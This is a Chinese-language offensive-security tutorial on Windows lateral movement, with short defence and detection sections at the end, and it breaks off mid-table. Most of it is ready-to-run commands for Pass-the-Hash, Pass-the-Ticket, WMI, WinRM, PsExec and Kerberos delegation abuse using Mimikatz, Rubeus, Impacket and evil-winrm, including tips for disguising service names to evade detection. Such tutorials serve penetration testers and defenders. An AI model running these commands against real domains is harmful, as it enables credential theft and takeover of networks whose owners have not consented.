# 横向移动技术

## 1. 横向移动概述

### 1.1 什么是横向移动

横向移动（Lateral Movement）是指攻击者在获得初始访问权限后，在网络内部从一台主机移动到另一台主机的过程。这是内网渗透的核心环节，目标是：

- 访问高价值目标（域控制器、数据库服务器）
- 获取更高权限账户
- 扩大攻击面和控制范围
- 建立持久化访问

### 1.2 横向移动前提条件

**必要条件：**
- 有效的凭证（密码、哈希、票据）
- 目标主机的访问权限
- 可用的远程执行通道
- 目标主机存在可利用的服务

**常见凭证来源：**
- 内存中提取的明文密码
- 导出的NTLM哈希
- Kerberos票据
- 本地存储的凭证

### 1.3 横向移动技术分类

| 技术类型 | 说明 | 常用方法 |
|----------|------|----------|
| 凭证传递 | 使用哈希/票据认证 | PtH、PtT、Over-PtH |
| 远程执行 | 利用远程管理服务 | WMI、WinRM、PSExec |
| 服务利用 | 利用特定服务漏洞 | RDP、SMB、计划任务 |
| 委派攻击 | 利用Kerberos委派 | 约束委派、非约束委派 |

## 2. Pass-the-Hash（哈希传递）

### 2.1 原理说明

Pass-the-Hash（PtH）攻击利用NTLM认证协议的特性，攻击者可以使用用户的NTLM哈希而非明文密码进行认证。这是因为在NTLM认证过程中，服务器只需要验证哈希值，而非明文密码。

**适用场景：**
- 获取了用户NTLM哈希但无法破解
- 目标系统使用NTLM认证
- 域环境中的横向移动

**限制条件：**
- 目标账户不能启用智能卡登录
- Windows 8.1/2012 R2及以上默认禁止PtH（需配置）

### 2.2 Mimikatz PtH

**基本PtH攻击：**
```powershell
# 使用NTLM哈希进行认证
mimikatz.exe "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:5f4d5a3b2c1e0f9a8b7c6d5e4f3a2b1c" exit

# 执行后会在新进程中加载凭证，可使用该进程访问目标
```

**完整示例：**
```powershell
# 1. 提取哈希
mimikatz.exe "sekurlsa::logonpasswords" exit

# 2. 使用哈希传递
mimikatz.exe "sekurlsa::pth /user:admin /domain:corp.local /ntlm:NTLMHASH /run:cmd.exe" exit

# 3. 在弹出的cmd中使用net use访问目标
net use \\web01.corp.local\c$
```

**使用AES密钥：**
```powershell
# 使用AES128/AES256密钥（更隐蔽）
mimikatz.exe "sekurlsa::pth /user:admin /domain:corp.local /aes128:AES128KEY /aes256:AES256KEY" exit
```

## 3. Pass-the-Ticket（票据传递）

### 3.1 原理说明

Pass-the-Ticket（PtT）攻击利用Kerberos认证机制，攻击者可以使用窃取的Kerberos票据直接访问服务，无需密码或哈希。

**票据类型：**
- **TGT（Ticket Granting Ticket）**：用于获取服务票据
- **ST（Service Ticket）**：用于访问特定服务

**优势：**
- 不需要明文密码或哈希
- 可以绕过某些检测
- 支持跨域访问

### 3.2 Mimikatz PtT

**导出和注入票据：**
```powershell
# 导出当前会话的Kerberos票据
mimikatz.exe "sekurlsa::tickets /export" exit

# 注入票据到当前会话
mimikatz.exe "kerberos::ptt ticket.kirbi" exit

# 注入后可以直接访问服务
dir \\web01.corp.local\c$
```

**从内存直接传递：**
```powershell
# 列出内存中的票据
mimikatz.exe "sekurlsa::tickets" exit

# 直接使用内存中的票据
mimikatz.exe "sekurlsa::pth /user:admin /domain:corp.local /ntlm:NTLMHASH" exit
```

### 3.3 Rubeus PtT

**票据操作：**
```powershell
# 导出当前票据
Rubeus.exe dump

# 导出特定服务的票据
Rubeus.exe dump /service:HTTP/web01.corp.local

# 请求TGT
Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:corp.local /ptt

# 请求服务票据
Rubeus.exe asktgs /service:cifs/web01.corp.local /dc:dc01.corp.local /ptt

# 注入票据
Rubeus.exe ptt /ticket:BASE64TICKET
```

**Over-Pass-the-Hash：**
```powershell
# 使用哈希请求TGT并注入
Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:corp.local /ptt

# 使用AES密钥
Rubeus.exe asktgt /user:admin /aes256:AES256KEY /domain:corp.local /ptt
```

### 3.4 跨域票据传递

```powershell
# 获取跨域信任票据
Rubeus.exe asktgs /service:krbtgt/trusted.local /dc:dc01.corp.local /ptt

# 使用跨域票据访问目标域资源
Rubeus.exe asktgs /service:cifs/dc01.trusted.local /dc:dc01.trusted.local /ptt
```

## 4. WMI远程执行

### 4.1 WMI概述

WMI（Windows Management Instrumentation）是Windows的管理框架，提供远程管理能力，是横向移动的常用方式。

**优势：**
- 系统内置，无需额外安装
- 支持远程命令执行
- 相对隐蔽
- 使用RPC/DCOM协议

**端口要求：**
- RPC：135
- 动态端口范围：49152-65535

### 4.2 原生WMI命令

**wmic远程执行：**
```cmd
# 远程查询系统信息
wmic /node:192.168.1.20 /user:corp\admin /password:Pass123 computersystem get name

# 远程执行命令
wmic /node:192.168.1.20 /user:corp\admin /password:Pass123 process call create "cmd.exe /c whoami"

# 远程创建进程
wmic /node:192.168.1.20 /user:corp\admin /password:Pass123 process call create "powershell.exe -enc BASE64COMMAND"

# 远程查询进程
wmic /node:192.168.1.20 /user:corp\admin /password:Pass123 process get name,processid
```

### 4.3 PowerShell WMI

**使用PowerShell进行WMI操作：**
```powershell
# 远程WMI查询
Get-WmiObject -Class Win32_OperatingSystem -ComputerName 192.168.1.20 -Credential $cred

# 远程执行命令
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName 192.168.1.20 -Credential $cred

# 使用CIM（新版）
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"} -ComputerName 192.168.1.20 -Credential $cred
```

### 4.4 wmiexec工具

**Impacket wmiexec：**
```bash
# 基本使用
impacket-wmiexec corp/admin:Password123@192.168.1.20

# 执行单条命令
impacket-wmiexec corp/admin:Password123@192.168.1.20 "whoami"

# 使用哈希认证
impacket-wmiexec -hashes :5f4d5a3b2c1e0f9a8b7c6d5e4f3a2b1c corp/admin@192.168.1.20

# 指定域控
impacket-wmiexec -dc-ip 192.168.1.10 corp/admin:Password123@192.168.1.20
```

## 5. WinRM远程执行

### 5.1 WinRM概述

WinRM（Windows Remote Management）是Windows的远程管理服务，基于WS-Management协议，支持PowerShell远程会话。

**优势：**
- 原生支持PowerShell远程
- 使用HTTP/HTTPS协议
- 支持加密传输
- 集成Windows认证

**端口要求：**
- HTTP：5985
- HTTPS：5986

### 5.2 PowerShell Remoting

**基本远程会话：**
```powershell
# 创建远程会话
$session = New-PSSession -ComputerName 192.168.1.20 -Credential $cred

# 在远程会话中执行命令
Invoke-Command -Session $session -ScriptBlock { whoami }

# 执行本地脚本
Invoke-Command -Session $session -FilePath .\script.ps1

# 进入交互会话
Enter-PSSession -ComputerName 192.168.1.20 -Credential $cred

# 退出会话
Exit-PSSession

# 关闭会话
Remove-PSSession -Session $session
```

**一键式远程执行：**
```powershell
# 直接执行命令
Invoke-Command -ComputerName 192.168.1.20 -Credential $cred -ScriptBlock { Get-Process }

# 多主机执行
Invoke-Command -ComputerName @("web01","web02","sql01") -Credential $cred -ScriptBlock { hostname }

# 使用哈希认证（需要Over-PtH）
# 先注入票据，再执行
Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:corp.local /ptt
Invoke-Command -ComputerName web01.corp.local -ScriptBlock { whoami }
```

### 5.3 evil-winrm工具

**基本使用：**
```bash
# 使用密码连接
evil-winrm -i 192.168.1.20 -u admin -p Password123

# 使用哈希连接
evil-winrm -i 192.168.1.20 -u admin -H 5f4d5a3b2c1e0f9a8b7c6d5e4f3a2b1c

# 指定域
evil-winrm -i 192.168.1.20 -u admin -p Password123 -d corp.local

# 上传文件
evil-winrm -i 192.168.1.20 -u admin -p Password123 -u local_file -d remote_path

# 下载文件
evil-winrm -i 192.168.1.20 -u admin -p Password123 -d remote_file -u local_path
```

## 6. PsExec变体

### 6.1 PsExec概述

PsExec是Sysinternals套件中的远程执行工具，通过创建远程服务实现命令执行。

**工作原理：**
1. 连接目标主机的ADMIN$共享
2. 上传PSEXESVC.exe服务程序
3. 创建并启动服务
4. 执行命令并获取输出
5. 停止并删除服务

**检测特征：**
- ADMIN$共享访问
- PSEXESVC服务创建
- 服务启动日志

### 6.2 PsExec使用

**基本用法：**
```cmd
# 远程执行命令
psexec \\192.168.1.20 -u corp\admin -p Password123 cmd.exe

# 执行单条命令
psexec \\192.168.1.20 -u corp\admin -p Password123 -c whoami

# 以系统权限运行
psexec \\192.168.1.20 -u corp\admin -p Password123 -s cmd.exe

# 交互式会话
psexec \\192.168.1.20 -u corp\admin -p Password123 -i cmd.exe
```

### 6.3 Impacket psexec

```bash
# 基本使用
impacket-psexec corp/admin:Password123@192.168.1.20

# 使用哈希
impacket-psexec -hashes :5f4d5a3b2c1e0f9a8b7c6d5e4f3a2b1c corp/admin@192.168.1.20

# 指定服务名称（隐蔽）
impacket-psexec -service-name "UpdateService" corp/admin:Password123@192.168.1.20
```

### 6.4 PAExec（PsExec替代）

PAExec是PsExec的开源替代品，可自定义服务名称：

```cmd
# 使用自定义服务名
paexec \\192.168.1.20 -s -c cmd.exe -r "WindowsUpdate"

# 减少检测特征
paexec \\192.168.1.20 -u admin -p Password123 -r "svchost" cmd.exe
```

## 8. 委派攻击

### 8.1 非约束委派

**原理：**
非约束委派允许服务模拟任意用户访问其他服务，用户访问服务时，TGT会被发送给服务并缓存在内存中。

**发现非约束委派：**
```powershell
# PowerView查找
Get-NetComputer -Unconstrained
Get-NetUser -Unconstrained

# BloodHound查询
MATCH (c:Computer) WHERE c.unconstraineddelegation = true RETURN c.name
```

**利用方法：**
```powershell
# 1. 获取非约束委派服务器的访问权限
# 2. 等待高权限用户访问该服务
# 3. 从内存中提取缓存的TGT
mimikatz.exe "sekurlsa::tickets" exit

# 4. 注入TGT并访问目标
mimikatz.exe "kerberos::ptt ticket.kirbi" exit
net use \\dc01.corp.local\c$
```

### 8.2 约束委派

**原理：**
约束委派限制服务只能模拟用户访问特定服务，但攻击者仍可利用此特性进行横向移动。

**发现约束委派：**
```powershell
# 查找约束委派账户
Get-NetUser -TrustedToAuth | Select-Object samAccountName,msds-allowedtodelegateto

# BloodHound查询
MATCH (u:User) WHERE u.allowedtodelegate IS NOT NULL RETURN u.name, u.allowedtodelegate
```

**利用方法：**
```powershell
# 使用Rubeus利用约束委派
# 1. 获取服务账户的哈希或票据
# 2. 请求访问目标服务的票据
Rubeus.exe s4u /user:svc_web /rc4:NTLMHASH /impersonateuser:administrator /domain:corp.local /msdsspn:cifs/dc01.corp.local /ptt

# 3. 访问目标服务
dir \\dc01.corp.local\c$
```

### 8.3 基于资源的约束委派（RBCD）

**原理：**
RBCD允许通过修改目标计算机的msDS-AllowedToActOnBehalfOfOtherIdentity属性来配置委派。

**利用条件：**
- 对目标计算机有WriteDACL或GenericAll权限
- 可以创建计算机账户（MAQ > 0）

**利用方法：**
```powershell
# 1. 创建新计算机账户
$pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
New-ADComputer -Name "FAKEPC$" -SamAccountName "FAKEPC$" -PassThru -AccountPassword $pass

# 2. 配置RBCD
Set-ADComputer -Identity "TARGET$" -PrincipalsAllowedToDelegateToAccount "FAKEPC$"

# 3. 使用Rubeus获取票据
Rubeus.exe hash /password:Password123! /user:FAKEPC$ /domain:corp.local
Rubeus.exe s4u /user:FAKEPC$ /rc4:NTLMHASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt

# 4. 访问目标
dir \\target.corp.local\c$
```

## 9. 哈希传递防御

### 9.1 防御措施

**技术层面：**
- 启用Windows Defender Credential Guard
- 配置受限管理员模式
- 禁用NTLM认证（仅使用Kerberos）
- 实施特权访问管理（PAM）

**配置Credential Guard：**
```powershell
# 检查Credential Guard状态
Get-ComputerInfo | Select-Object DeviceGuardSmartSecurityStatus

# 通过组策略启用
# 计算机配置 → 管理模板 → 系统 → Device Guard → 打开基于虚拟化的安全
```

**配置受限管理员模式：**
```powershell
# 启用受限管理员模式（RDP）
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f

# 启用受限管理员模式出站RDP
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdminOutboundCreds /t REG_DWORD /d 0 /f
```

### 9.2 检测方法

**日志监控：**
```
# 关键事件ID
4624 - 登录成功（注意登录类型）
4625 - 登录失败
4634 - 注销事件
4648 - 使用显式凭证登录

# 可疑登录类型
类型3 - 网络登录（PtH常用）
类型9 - 新凭证登录
```

**检测PtH迹象：**
```powershell
# 检查异常登录
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | 
    Where-Object {$_.Message -match "Logon Type:\s+3"} |
    Select-Object TimeCreated,Message

# 检查服务创建（PsExec特征）
Get-WinEvent -FilterHashtable @{LogName='System';ID=7045} |
    Where-Object {$_.Message -match "PSEXESVC"}
```

### 9.3 网络层防护

**网络分段：**
- 将关键服务器隔离在独立网段
- 限制管理员工作站访问范围
- 实施跳板机/堡垒机架构

**流量监控：**
- 监控异常的SMB/WMI流量
- 检测横向扫描行为
- 分析远程执行模式

### 10.1 技术选择指南

| 场景 | 推荐技术 | 原因 |
